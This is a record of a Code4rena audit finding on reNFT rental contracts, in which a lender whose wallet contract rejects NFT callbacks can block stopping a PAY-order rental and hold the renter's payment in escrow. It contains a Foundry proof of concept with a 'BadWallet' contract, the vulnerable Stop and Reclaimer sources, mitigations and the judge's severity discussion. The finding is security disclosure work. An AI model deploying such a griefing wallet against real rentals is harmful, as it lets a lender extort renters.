{
  "Title": "[M-14] Lender of a PAY order lending can grief renter of the payment",
  "Content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43>\n\nIn a PAY order lending, the renter is payed by the lender to rent the NFT. When the rent is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265), transfers the NFT from the renter's Safe back to the lender and transfers the payment to the renter.\n\nTo transfer the NFT from the Safe, [`_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166) is used, which makes the Safe contract execute a delegatecall to `Stop.reclaimRentalOrder()`, which is inherited from [`Reclaimer.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71). This function uses [`ERC721.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33) or [`ERC1155.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43) to transfer the the NFT.\n\nIf the recipient of the NFT (the lender's wallet) is a smart contract, the `safeTransferFrom()` functions will call the `onERC721Received()` or `onERC1155BatchReceived()` callback on the lender's wallet. If those functions don't return the corresponding magic bytes4 value or revert, the transfer will revert. In this case stopping the rental will fail, the NFT will still be in the renter's wallet and the payment will stay in the payment escrow contract.\n\n### Impact\n\nA malicious lender can use this vulnerability to grief a PAY order renter of their payment by having the  `onERC721Received()` or `onERC1155BatchReceived()` callback function revert or not return the magic bytes4 value. They will need to give up the lent out NFT in return which will be stuck in the renter's Safe (and usable for the renter within the limitations of the rental Safe).\n\nHowever, the lender has the ability to release the NFT and payment anytime by making the callback function revert conditional on some parameter that they can set in their contract. This allows them to hold the renter's payment for ransom and making the release conditional on e.g. a payment from the renter to the lender. The lender has no risk here, as they can release their NFT at any time.\n\n### Proof of Concept\n\nAdd the following code to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):\n\n<details>\n\n```diff\ndiff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol\nindex 3d19d3c..551a1b6 100644\n--- a/test/integration/StopRent.t.sol\n+++ b/test/integration/StopRent.t.sol\n@@ -7,6 +7,49 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n\n import {BaseTest} from \"@test/BaseTest.sol\";\n\n+import {Errors} from \"@src/libraries/Errors.sol\";\n+import {IERC721} from \"@openzeppelin-contracts/token/ERC721/IERC721.sol\";\n+import {IERC20} from \"@openzeppelin-contracts/token/ERC20/IERC20.sol\";\n+\n+contract BadWallet {\n+  bool receiveEnabled = true;\n+  address owner = msg.sender;\n+\n+  // To enable EIP-1271.\n+  // Normally isValidSignature actually validates if the signature is valid and from the owner.\n+  // This is not relevant to the PoC, so we just validate anything here.\n+  function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {\n+    return this.isValidSignature.selector;\n+  }\n+\n+  function doApproveNFT(address target, address spender) external {\n+    require(msg.sender == owner);\n+    IERC721(target).setApprovalForAll(spender, true);\n+  }\n+\n+  function doApproveERC20(address target, address spender, uint256 amount) external {\n+    require(msg.sender == owner);\n+    IERC20(target).approve(spender, amount);\n+  }\n+\n+  function setReceiveEnabled(bool status) external {\n+    require(msg.sender == owner);\n+    receiveEnabled = status;\n+  }\n+\n+  function onERC721Received(\n+        address,\n+        address,\n+        uint256,\n+        bytes calldata\n+  ) external view returns (bytes4) {\n+    if (receiveEnabled)\n+      return this.onERC721Received.selector;\n+    else\n+      revert(\"Nope\");\n+  }\n+}\n+\n contract TestStopRent is BaseTest {\n     function test_StopRent_BaseOrder() public {\n         // create a BASE order\n```\n</details>\n\nAdd the following test to `StopRent.t.sol`:\n\n<details>\n\n```solidity\n    function test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed() public {\n        vm.startPrank(alice.addr);\n        BadWallet badWallet = new BadWallet();\n        erc20s[0].transfer(address(badWallet), 100);\n        badWallet.doApproveNFT(address(erc721s[0]), address(conduit));\n        badWallet.doApproveERC20(address(erc20s[0]), address(conduit), 100);\n        vm.stopPrank();\n        // Alice's key will be used for signing, but the newly create SC wallet will be used as her address\n        address aliceAddr = alice.addr;\n        alice.addr = address(badWallet);\n\n        // create a PAY order\n        // this will mint the NFT to alice.addr\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.PAY,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 1,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 0\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payOrder,\n            bytes32 payOrderHash,\n            OrderMetadata memory payOrderMetadata\n        ) = finalizeOrder();\n\n        // create a PAYEE order. The fulfiller will be the offerer.\n        createOrder({\n            offerer: bob,\n            orderType: OrderType.PAYEE,\n            erc721Offers: 0,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 1,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payeeOrder,\n            bytes32 payeeOrderHash,\n            OrderMetadata memory payeeOrderMetadata\n        ) = finalizeOrder();\n    \n        // Ensure that ERC721.safeTransferFrom to the wallet now reverts\n        vm.prank(aliceAddr);\n        badWallet.setReceiveEnabled(false);\n  \n        // create an order fulfillment for the pay order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payOrder,\n            orderHash: payOrderHash,\n            metadata: payOrderMetadata\n        });\n  \n        // create an order fulfillment for the payee order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payeeOrder,\n            orderHash: payeeOrderHash,\n            metadata: payeeOrderMetadata\n        });\n    \n        // add an amendment to include the seaport fulfillment structs\n        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n\n        // finalize the order pay/payee order fulfillment\n        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // try to stop the rental order\n        vm.prank(bob.addr);\n        vm.expectRevert(Errors.StopPolicy_ReclaimFailed.selector);\n        stop.stopRent(payRentalOrder);\n\n        // get the rental order hashes\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n\n        // assert that the rental order still exists in storage\n        assertEq(STORE.orders(payRentalOrderHash), true);\n\n        // assert that the token is still rented out in storage\n        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n\n        // assert that the ERC721 is still in the Safe\n        assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n\n        // assert that the offerer made a payment\n        assertEq(erc20s[0].balanceOf(aliceAddr), uint256(9900));\n\n        // assert that the fulfiller did not received the payment\n        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));\n\n        // assert that a payment was not pulled from the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n    }\n```\n\n</details>\n\nNow the PoC can be run with:\n\n    forge test --match-path test/integration/StopRent.t.sol --match-test test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed -vvv\n\n### Recommended Mitigation Steps\n\nI see three ways to mitigate this (however, the third one is incomplete):\n\n*   Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.\n*   Change `Stop._reclaimRentedItems()` so that it doesn't revert when the transfer is unsuccessful.\n*   For ERC721 use `ERC721.transferFrom()` instead of `ERC721.safeTransferFrom()` to transfer the NFT back to the lender. I believe it is reasonable to assume that the wallet that was suitable to hold a ERC721 before the rental is still suitable to hold a ERC721 after the rental and the `onERC721Received` check is not necessary in this case. For ERC1155 this mitigation cannot be used because ERC1155 only has a `safeTransferFrom()` function that always does the receive check. So this mitigation is incomplete.\n\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1908313192)**\n\n**[JCN (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916120705):**\n > Hi @0xean ,\n> \n> It seems [Issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) also identifies the same root cause as this issue: A lender can implement a malicious callback to DOS the `stop` calls. \n> \n> However, this issue does not demonstrate a freezing of victim (renter) \"owned\" assets. In this issue the lender (attacker) is allowing their NFT and rental payment to be frozen in order to grief the victim. However, I would argue that the victim is not impacted in a way that warrants a `high` severity. Although the victim can not receive the proposed rental payment, they will essentially be able to utilize the rented NFT while the lender is \"griefing\" them. The renter is only losing \"theoretical capital\" in this situation (i.e. the rental payment, which was supplied by the attacker), but would be gaining access to the rented NFT for additional time.\n> \n> Meanwhile, [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) has identified how to leverage the root cause in this issue with another bug (`safe wallet can't differentiate between non-rented and rented ERC1155 tokens`) in order to permanently freeze a victim's ERC1155 tokens in their safe wallet. \n> \n> Given the information above, can you please provide the rationale behind labeling this issue (and duplicates) as `high` severity, while labeling [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and duplicates) as `medium` severity? Based on my observations it seems this issue (and duplicates) should be of `medium` severity. However, if its `high` severity status is maintained, then I would think that [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and its duplicates) should be of `high` severity as well since these issues demonstrate a greater impact. \n> \n> I appreciate you taking the time to read my comment. \n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916974749):**\n > @0xJCN thanks for the comment. \n> \n> I have re-read the impact and better understand this issue as a result.  I do not agree that this loss is \"theoretical\", a withheld payment is not theoretical, however it is temporary if the lender has any intention to ever receive back their NFT and therefore since its temporary and not a complete loss I do think M is more appropriate.\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/65)._\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-01-renft",
  "Code": [
    {
      "filename": "src/packages/Reclaimer.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {IERC721} from \"@openzeppelin-contracts/token/ERC721/IERC721.sol\";\nimport {IERC1155} from \"@openzeppelin-contracts/token/ERC1155/IERC1155.sol\";\n\nimport {RentalOrder, Item, ItemType} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\n\n/**\n * @title Reclaimer\n * @notice Retrieves rented assets from a wallet contract once a rental has been\n *         stopped, and transfers them to the proper recipient.\n */\nabstract contract Reclaimer {\n    // The original address that this contract was deployed with\n    address private immutable original;\n\n    /**\n     * @dev Use the constructor to store the original deployment address.\n     */\n    constructor() {\n        original = address(this);\n    }\n\n    /**\n     * @dev Helper function to transfer an ERC721 token.\n     *\n     * @param item      Item which will be transferred.\n     * @param recipient Address which will receive the token.\n     */\n    function _transferERC721(Item memory item, address recipient) private {\n        IERC721(item.token).safeTransferFrom(address(this), recipient, item.identifier);\n    }\n\n    /**\n     * @dev Helper function to transfer an ERC1155 token.\n     *\n     * @param item      Item which will be transferred.\n     * @param recipient Address which will receive the token.\n     */\n    function _transferERC1155(Item memory item, address recipient) private {\n        IERC1155(item.token).safeTransferFrom(\n            address(this),\n            recipient,\n            item.identifier,\n            item.amount,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Reclaims the assets that are currently owned by a rental safe.\n     *         This function is intended to be delegate called by the safe.\n     *\n     *         NOTE: At first, it may seem that this function can be used to exploit\n     *         the safe, since this is an external function that can transfer tokens\n     *         out of a rental safe, so long as the caller is:\n     *             1) Using delegate call to extract the assets\n     *             2) The rental safe that holds those assets\n     *\n     *         This exploit is prevented because delegate calls from the rental safe can\n     *         only be made to addresses which have been explicitly whitelisted by the\n     *         Admin policy. Further, since the Stop policy is a whitelisted module on\n     *         the safe, `reclaimRentalOrder()` can only be called via the context of the\n     *         Stop policy contract, which prevents unauthorized reclaiming.\n     *\n     * @param rentalOrder Order which will have its contained items reclaimed by the\n     *                    recipient parties.\n     */\n    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {\n        // This contract address must be in the context of another address.\n        if (address(this) == original) {\n            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();\n        }\n\n        // Only the rental wallet specified in the order can be the address that\n        // initates the reclaim. In the context of a delegate call, address(this)\n        // will be the safe.\n        if (address(this) != rentalOrder.rentalWallet) {\n            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(\n                rentalOrder.rentalWallet\n            );\n        }\n\n        // Get a count for the number of items.\n        uint256 itemCount = rentalOrder.items.length;\n\n        // Transfer each item if it is a rented asset.\n        for (uint256 i = 0; i < itemCount; ++i) {\n            Item memory item = rentalOrder.items[i];\n\n            // Check if the item is an ERC721.\n            if (item.itemType == ItemType.ERC721)\n                _transferERC721(item, rentalOrder.lender);\n\n            // check if the item is an ERC1155.\n            if (item.itemType == ItemType.ERC1155)\n                _transferERC1155(item, rentalOrder.lender);\n        }\n    }\n}"
    },
    {
      "filename": "src/packages/Reclaimer.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {IERC721} from \"@openzeppelin-contracts/token/ERC721/IERC721.sol\";\nimport {IERC1155} from \"@openzeppelin-contracts/token/ERC1155/IERC1155.sol\";\n\nimport {RentalOrder, Item, ItemType} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\n\n/**\n * @title Reclaimer\n * @notice Retrieves rented assets from a wallet contract once a rental has been\n *         stopped, and transfers them to the proper recipient.\n */\nabstract contract Reclaimer {\n    // The original address that this contract was deployed with\n    address private immutable original;\n\n    /**\n     * @dev Use the constructor to store the original deployment address.\n     */\n    constructor() {\n        original = address(this);\n    }\n\n    /**\n     * @dev Helper function to transfer an ERC721 token.\n     *\n     * @param item      Item which will be transferred.\n     * @param recipient Address which will receive the token.\n     */\n    function _transferERC721(Item memory item, address recipient) private {\n        IERC721(item.token).safeTransferFrom(address(this), recipient, item.identifier);\n    }\n\n    /**\n     * @dev Helper function to transfer an ERC1155 token.\n     *\n     * @param item      Item which will be transferred.\n     * @param recipient Address which will receive the token.\n     */\n    function _transferERC1155(Item memory item, address recipient) private {\n        IERC1155(item.token).safeTransferFrom(\n            address(this),\n            recipient,\n            item.identifier,\n            item.amount,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Reclaims the assets that are currently owned by a rental safe.\n     *         This function is intended to be delegate called by the safe.\n     *\n     *         NOTE: At first, it may seem that this function can be used to exploit\n     *         the safe, since this is an external function that can transfer tokens\n     *         out of a rental safe, so long as the caller is:\n     *             1) Using delegate call to extract the assets\n     *             2) The rental safe that holds those assets\n     *\n     *         This exploit is prevented because delegate calls from the rental safe can\n     *         only be made to addresses which have been explicitly whitelisted by the\n     *         Admin policy. Further, since the Stop policy is a whitelisted module on\n     *         the safe, `reclaimRentalOrder()` can only be called via the context of the\n     *         Stop policy contract, which prevents unauthorized reclaiming.\n     *\n     * @param rentalOrder Order which will have its contained items reclaimed by the\n     *                    recipient parties.\n     */\n    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {\n        // This contract address must be in the context of another address.\n        if (address(this) == original) {\n            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();\n        }\n\n        // Only the rental wallet specified in the order can be the address that\n        // initates the reclaim. In the context of a delegate call, address(this)\n        // will be the safe.\n        if (address(this) != rentalOrder.rentalWallet) {\n            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(\n                rentalOrder.rentalWallet\n            );\n        }\n\n        // Get a count for the number of items.\n        uint256 itemCount = rentalOrder.items.length;\n\n        // Transfer each item if it is a rented asset.\n        for (uint256 i = 0; i < itemCount; ++i) {\n            Item memory item = rentalOrder.items[i];\n\n            // Check if the item is an ERC721.\n            if (item.itemType == ItemType.ERC721)\n                _transferERC721(item, rentalOrder.lender);\n\n            // check if the item is an ERC1155.\n            if (item.itemType == ItemType.ERC1155)\n                _transferERC1155(item, rentalOrder.lender);\n        }\n    }\n}"
    },
    {
      "filename": "src/policies/Stop.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {Enum} from \"@safe-contracts/common/Enum.sol\";\nimport {LibString} from \"@solady/utils/LibString.sol\";\n\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {IHook} from \"@src/interfaces/IHook.sol\";\n\nimport {Kernel, Policy, Permissions, Keycode} from \"@src/Kernel.sol\";\nimport {toKeycode} from \"@src/libraries/KernelUtils.sol\";\nimport {RentalUtils} from \"@src/libraries/RentalUtils.sol\";\nimport {Signer} from \"@src/packages/Signer.sol\";\nimport {Reclaimer} from \"@src/packages/Reclaimer.sol\";\nimport {Accumulator} from \"@src/packages/Accumulator.sol\";\nimport {Storage} from \"@src/modules/Storage.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {Events} from \"@src/libraries/Events.sol\";\nimport {\n    Item,\n    RentalOrder,\n    Hook,\n    OrderType,\n    ItemType,\n    RentalId,\n    RentalAssetUpdate\n} from \"@src/libraries/RentalStructs.sol\";\n\n/**\n * @title Stop\n * @notice Acts as an interface for all behavior related to stoping a rental.\n */\ncontract Stop is Policy, Signer, Reclaimer, Accumulator {\n    using RentalUtils for Item;\n    using RentalUtils for Item[];\n    using RentalUtils for OrderType;\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                         Kernel Policy Configuration                         //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    // Modules that the policy depends on.\n    Storage public STORE;\n    PaymentEscrow public ESCRW;\n\n    /**\n     * @dev Instantiate this contract as a policy.\n     *\n     * @param kernel_ Address of the kernel contract.\n     */\n    constructor(Kernel kernel_) Policy(kernel_) Signer() Reclaimer() {}\n\n    /**\n     * @notice Upon policy activation, configures the modules that the policy depends on.\n     *         If a module is ever upgraded that this policy depends on, the kernel will\n     *         call this function again to ensure this policy has the current address\n     *         of the module.\n     *\n     * @return dependencies Array of keycodes which represent modules that\n     *                      this policy depends on.\n     */\n    function configureDependencies()\n        external\n        override\n        onlyKernel\n        returns (Keycode[] memory dependencies)\n    {\n        dependencies = new Keycode[](2);\n\n        dependencies[0] = toKeycode(\"STORE\");\n        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n        dependencies[1] = toKeycode(\"ESCRW\");\n        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n    }\n\n    /**\n     * @notice Upon policy activation, permissions are requested from the kernel to access\n     *         particular keycode <> function selector pairs. Once these permissions are\n     *         granted, they do not change and can only be revoked when the policy is\n     *         deactivated by the kernel.\n     *\n     * @return requests Array of keycode <> function selector pairs which represent\n     *                  permissions for the policy.\n     */\n    function requestPermissions()\n        external\n        view\n        override\n        onlyKernel\n        returns (Permissions[] memory requests)\n    {\n        requests = new Permissions[](4);\n        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.removeRentals.selector);\n        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.removeRentalsBatch.selector);\n        requests[2] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePayment.selector);\n        requests[3] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePaymentBatch.selector);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            Internal Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @dev Helper function to emit an event which signals a rental order has stopped.\n     *\n     * @param seaportOrderHash Order hash of the seaport order.\n     * @param stopper Address which stopped the rental order.\n     */\n    function _emitRentalOrderStopped(bytes32 seaportOrderHash, address stopper) internal {\n        // Wmit the event.\n        emit Events.RentalOrderStopped(seaportOrderHash, stopper);\n    }\n\n    /**\n     * @dev Validates that a rental order can be stopped. Whether an order\n     *      can be stopped is dependent on the type of order. BASE orders can\n     *      be stopped only when the rental has expired. PAY orders can be stopped\n     *      by the lender at any point in the time.\n     *\n     * @param orderType Order type of the rental order to stop.\n     * @param endTimestamp Timestamp that the rental will end.\n     * @param expectedLender Address of the initial lender in the order.\n     */\n    function _validateRentalCanBeStoped(\n        OrderType orderType,\n        uint256 endTimestamp,\n        address expectedLender\n    ) internal view {\n        // Determine if the order has expired.\n        bool hasExpired = endTimestamp <= block.timestamp;\n\n        // Determine if the fulfiller is the lender of the order.\n        bool isLender = expectedLender == msg.sender;\n\n        // BASE orders processing.\n        if (orderType.isBaseOrder()) {\n            // check that the period for the rental order has expired.\n            if (!hasExpired) {\n                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);\n            }\n        }\n        // PAY order processing.\n        else if (orderType.isPayOrder()) {\n            // If the stopper is the lender, then it doesnt matter whether the rental\n            // has expired. But if the stopper is not the lender, then the rental must have expired.\n            if (!isLender && (!hasExpired)) {\n                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);\n            }\n        }\n        // Revert if given an invalid order type.\n        else {\n            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n        }\n    }\n\n    /**\n     * @dev Since the stop policy is an enabled Gnosis Safe module on all rental safes, it\n     *      can be used to execute a transaction directly from the rental safe which retrieves\n     *      the rented assets. This call bypasses the guard that prevents the assets from being\n     *      transferred.\n     *\n     * @param order Rental order to reclaim the items for.\n     */\n    function _reclaimRentedItems(RentalOrder memory order) internal {\n        // Transfer ERC721s from the renter back to lender.\n        bool success = ISafe(order.rentalWallet).execTransactionFromModule(\n            // Stop policy inherits the reclaimer package.\n            address(this),\n            // value.\n            0,\n            // The encoded call to the `reclaimRentalOrder` function.\n            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),\n            // Safe must delegate call to the stop policy so that it is the msg.sender.\n            Enum.Operation.DelegateCall\n        );\n\n        // Assert that the transfer back to the lender was successful.\n        if (!success) {\n            revert Errors.StopPolicy_ReclaimFailed();\n        }\n    }\n\n    /**\n     * @dev When a rental order is stopped, process each hook one by one but only if\n     *      the hook's status is set to execute on a rental stop.\n     *\n     * @param hooks        Array of hooks to process for the order.\n     * @param rentalItems  Array of rental items which are referenced by the hooks\n     * @param rentalWallet Address of the rental wallet which is the current owner\n     *                     of the rented assets.\n     */\n    function _removeHooks(\n        Hook[] calldata hooks,\n        Item[] calldata rentalItems,\n        address rentalWallet\n    ) internal {\n        // Define hook target, item index, and item.\n        address target;\n        uint256 itemIndex;\n        Item memory item;\n\n        // Loop through each hook in the payload.\n        for (uint256 i = 0; i < hooks.length; ++i) {\n            // Get the hook address.\n            target = hooks[i].target;\n\n            // Check that the hook is reNFT-approved to execute on rental stop.\n            if (!STORE.hookOnStop(target)) {\n                revert Errors.Shared_DisabledHook(target);\n            }\n\n            // Get the rental item index for this hook.\n            itemIndex = hooks[i].itemIndex;\n\n            // Get the rental item for this hook.\n            item = rentalItems[itemIndex];\n\n            // Make sure the item is a rented item.\n            if (!item.isRental()) {\n                revert Errors.Shared_NonRentalHookItem(itemIndex);\n            }\n\n            // Call the hook with data about the rented item.\n            try\n                IHook(target).onStop(\n                    rentalWallet,\n                    item.token,\n                    item.identifier,\n                    item.amount,\n                    hooks[i].extraData\n                )\n            {} catch Error(string memory revertReason) {\n                // Revert with reason given.\n                revert Errors.Shared_HookFailString(revertReason);\n            } catch Panic(uint256 errorCode) {\n                // Convert solidity panic code to string.\n                string memory stringErrorCode = LibString.toString(errorCode);\n\n                // Revert with panic code.\n                revert Errors.Shared_HookFailString(\n                    string.concat(\"Hook reverted: Panic code \", stringErrorCode)\n                );\n            } catch (bytes memory revertData) {\n                // Fallback to an error that returns the byte data.\n                revert Errors.Shared_HookFailBytes(revertData);\n            }\n        }\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            External Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Stops a rental by providing a `RentalOrder` struct. This data does not\n     *         exist in protocol storage, only the hash of the rental order. However,\n     *         during rental creation, all data needed to construct the rental order\n     *         is emitted as an event. A check is then made to ensure that the passed\n     *         in rental order matches the hash of a rental order in storage.\n     *\n     * @param order Rental order to stop.\n     */\n    function stopRent(RentalOrder calldata order) external {\n        // Check that the rental can be stopped.\n        _validateRentalCanBeStoped(order.orderType, order.endTimestamp, order.lender);\n\n        // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n        // the rented amount. From this point on, new memory cannot be safely allocated until the\n        // accumulator no longer needs to include elements.\n        bytes memory rentalAssetUpdates = new bytes(0);\n\n        // Check if each item in the order is a rental. If so, then generate the rental asset update.\n        // Memory will become safe again after this block.\n        for (uint256 i; i < order.items.length; ++i) {\n            if (order.items[i].isRental()) {\n                // Insert the rental asset update into the dynamic array.\n                _insert(\n                    rentalAssetUpdates,\n                    order.items[i].toRentalId(order.rentalWallet),\n                    order.items[i].amount\n                );\n            }\n        }\n\n        // Interaction: process hooks so they no longer exist for the renter.\n        if (order.hooks.length > 0) {\n            _removeHooks(order.hooks, order.items, order.rentalWallet);\n        }\n\n        // Interaction: Transfer rentals from the renter back to lender.\n        _reclaimRentedItems(order);\n\n        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.\n        ESCRW.settlePayment(order);\n\n        // Interaction: Remove rentals from storage by computing the order hash.\n        STORE.removeRentals(\n            _deriveRentalOrderHash(order),\n            _convertToStatic(rentalAssetUpdates)\n        );\n\n        // Emit rental order stopped.\n        _emitRentalOrderStopped(order.seaportOrderHash, msg.sender);\n    }\n\n    /**\n     * @notice Stops a batch of rentals by providing an array of `RentalOrder` structs.\n     *\n     * @param orders Array of rental orders to stop.\n     */\n    function stopRentBatch(RentalOrder[] calldata orders) external {\n        // Create an array of rental order hashes which will be removed from storage.\n        bytes32[] memory orderHashes = new bytes32[](orders.length);\n\n        // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n        // the rented amount. From this point on, new memory cannot be safely allocated until the\n        // accumulator no longer needs to include elements.\n        bytes memory rentalAssetUpdates = new bytes(0);\n\n        // Process each rental order.\n        // Memory will become safe after this block.\n        for (uint256 i = 0; i < orders.length; ++i) {\n            // Check that the rental can be stopped.\n            _validateRentalCanBeStoped(\n                orders[i].orderType,\n                orders[i].endTimestamp,\n                orders[i].lender\n            );\n\n            // Check if each item in the order is a rental. If so, then generate the rental asset update.\n            for (uint256 j = 0; j < orders[i].items.length; ++j) {\n                // Insert the rental asset update into the dynamic array.\n                if (orders[i].items[j].isRental()) {\n                    _insert(\n                        rentalAssetUpdates,\n                        orders[i].items[j].toRentalId(orders[i].rentalWallet),\n                        orders[i].items[j].amount\n                    );\n                }\n            }\n\n            // Add the order hash to an array.\n            orderHashes[i] = _deriveRentalOrderHash(orders[i]);\n\n            // Interaction: Process hooks so they no longer exist for the renter.\n            if (orders[i].hooks.length > 0) {\n                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet);\n            }\n\n            // Interaction: Transfer rental assets from the renter back to lender.\n            _reclaimRentedItems(orders[i]);\n\n            // Emit rental order stopped.\n            _emitRentalOrderStopped(orderHashes[i], msg.sender);\n        }\n\n        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.\n        ESCRW.settlePaymentBatch(orders);\n\n        // Interaction: Remove all rentals from storage.\n        STORE.removeRentalsBatch(orderHashes, _convertToStatic(rentalAssetUpdates));\n    }\n}"
    },
    {
      "filename": "src/policies/Stop.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {Enum} from \"@safe-contracts/common/Enum.sol\";\nimport {LibString} from \"@solady/utils/LibString.sol\";\n\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {IHook} from \"@src/interfaces/IHook.sol\";\n\nimport {Kernel, Policy, Permissions, Keycode} from \"@src/Kernel.sol\";\nimport {toKeycode} from \"@src/libraries/KernelUtils.sol\";\nimport {RentalUtils} from \"@src/libraries/RentalUtils.sol\";\nimport {Signer} from \"@src/packages/Signer.sol\";\nimport {Reclaimer} from \"@src/packages/Reclaimer.sol\";\nimport {Accumulator} from \"@src/packages/Accumulator.sol\";\nimport {Storage} from \"@src/modules/Storage.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {Events} from \"@src/libraries/Events.sol\";\nimport {\n    Item,\n    RentalOrder,\n    Hook,\n    OrderType,\n    ItemType,\n    RentalId,\n    RentalAssetUpdate\n} from \"@src/libraries/RentalStructs.sol\";\n\n/**\n * @title Stop\n * @notice Acts as an interface for all behavior related to stoping a rental.\n */\ncontract Stop is Policy, Signer, Reclaimer, Accumulator {\n    using RentalUtils for Item;\n    using RentalUtils for Item[];\n    using RentalUtils for OrderType;\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                         Kernel Policy Configuration                         //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    // Modules that the policy depends on.\n    Storage public STORE;\n    PaymentEscrow public ESCRW;\n\n    /**\n     * @dev Instantiate this contract as a policy.\n     *\n     * @param kernel_ Address of the kernel contract.\n     */\n    constructor(Kernel kernel_) Policy(kernel_) Signer() Reclaimer() {}\n\n    /**\n     * @notice Upon policy activation, configures the 